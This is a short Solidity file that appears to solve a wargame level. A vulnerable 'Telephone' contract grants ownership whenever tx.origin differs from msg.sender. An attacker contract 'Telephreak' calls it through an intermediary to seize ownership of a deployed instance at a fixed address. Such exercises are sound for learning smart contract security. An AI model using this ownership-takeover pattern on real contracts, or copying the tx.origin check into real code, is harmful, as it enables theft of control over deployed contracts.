pragma solidity ^0.8.0;

contract Telephreak {
  Telephone target = Telephone(0x7f93B6E1Cc12bF28a4Cfd4C720925436A70165f8);

  function phreak() external {
    //msg.sender here is you the player, but would be the tx.origin of the Telphone contract
    address _newOwner = msg.sender;
    target.changeOwner(_newOwner);
  }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}